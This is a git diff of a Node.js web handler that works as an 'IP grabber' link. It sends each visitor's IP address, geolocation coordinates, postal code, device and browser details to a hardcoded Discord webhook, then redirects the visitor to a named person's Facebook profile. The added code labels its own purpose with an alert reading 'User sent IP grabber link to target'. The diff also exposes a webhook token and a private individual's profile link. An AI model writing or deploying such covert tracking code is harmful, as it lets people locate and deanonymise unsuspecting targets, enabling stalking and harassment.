@@ -1,9 +1,8 @@
 import fetch from 'node-fetch';
 
-const mainWebhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";
-const hostingWebhookUrl = "https://discord.com/api/webhooks/your_other_webhook_url_here"; // Replace with your other webhook URL
+const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";
 
-async function sendToWebhook(webhookUrl, message) {
+async function sendToWebhook(message) {
     try {
         const response = await fetch(webhookUrl, {
             method: 'POST',
@@ -57,74 +56,83 @@ export default async function handler(req, res) {
             return;
         }
 
-        const userAgent = req.headers['user-agent'] || 'Unknown';
-        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
-        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
-        const referer = req.headers['referer'] || 'No referer';
-        
-        const deviceType = detectDeviceType(userAgent);
-        const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
-                              /Safari/.test(userAgent) ? 'WebKit' :
-                              /Gecko/.test(userAgent) ? 'Gecko' :
-                              /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
-        const os = /Windows/.test(userAgent) ? 'Windows' :
-                   /Mac/.test(userAgent) ? 'macOS' :
-                   /Android/.test(userAgent) ? 'Android' :
-                   /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
-
-        const coords = ipDetails.lat && ipDetails.lon
-            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
-            : "Not available";
-
-        // Create the message based on hosting status
-        const isHosting = ipDetails.hosting ? "Yes" : "No";
-        const mainMessage = {
-            username: "Extended Device Info Logger",
-            embeds: [
-                {
-                    title: "Extended Device and Network Information",
-                    color: 0x00FFFF,
-                    description: "Device info collected from a server request.",
-                    fields: [
-                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
-                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
-                        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
-                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
-                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
-                        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
-                        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
-                        { name: "Coords", value: coords, inline: true },
-                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
-                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
-                        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
-                        { name: "Operating System", value: `\`${os}\``, inline: true },
-                        { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
-                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
-                        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
-                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
-                        { name: "Referer", value: `\`${referer}\``, inline: false },
-                        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
-                        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                        { name: "Hosting", value: isHosting, inline: true }
-                    ]
-                }
-            ]
-        };
-
-        const hostingMessage = {
-            username: "Hosting Detection Logger",
-            content: `User is accessing from a hosting provider. \n**IP**: ${ipDetails.query}\n**Coords**: ${coords}`,
-        };
-
-        // Send to appropriate webhook based on hosting status
+        // If hosting is true, send a simple alert message
         if (ipDetails.hosting) {
-            await sendToWebhook(hostingWebhookUrl, hostingMessage);
+            const alertMessage = {
+                username: "Alert Logger",
+                content: "⚠️ **Alert:** User sent IP grabber link to target.",
+                embeds: [
+                    {
+                        title: "IP Grabber Alert",
+                        color: 0xFF0000, // Red color for alert
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true }
+                        ]
+                    }
+                ]
+            };
+            await sendToWebhook(alertMessage);
         } else {
-            await sendToWebhook(mainWebhookUrl, mainMessage);
+            // For non-hosting, send the usual detailed message
+            const userAgent = req.headers['user-agent'] || 'Unknown';
+            const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+            const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
+            const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
+            const referer = req.headers['referer'] || 'No referer';
+            
+            const deviceType = detectDeviceType(userAgent);
+            const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
+                                  /Safari/.test(userAgent) ? 'WebKit' :
+                                  /Gecko/.test(userAgent) ? 'Gecko' :
+                                  /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
+            const os = /Windows/.test(userAgent) ? 'Windows' :
+                       /Mac/.test(userAgent) ? 'macOS' :
+                       /Android/.test(userAgent) ? 'Android' :
+                       /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
+
+            const coords = ipDetails.lat && ipDetails.lon
+                ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
+                : "Not available";
+
+            const mainMessage = {
+                username: "Extended Device Info Logger",
+                embeds: [
+                    {
+                        title: "Extended Device and Network Information",
+                        color: 0x00FFFF,
+                        description: "Device info collected from a server request.",
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+                            { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+                            { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                            { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+                            { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+                            { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
+                            { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
+                            { name: "Coords", value: coords, inline: true },
+                            { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
+                            { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+                            { name: "Device Type", value: `\`${deviceType}\``, inline: true },
+                            { name: "Operating System", value: `\`${os}\``, inline: true },
+                            { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
+                            { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+                            { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
+                            { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+                            { name: "Referer", value: `\`${referer}\``, inline: false },
+                            { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+                            { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+                            { name: "Hosting", value: `\`No\``, inline: true }
+                        ]
+                    }
+                ]
+            };
+
+            await sendToWebhook(mainMessage);
         }
         
         res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
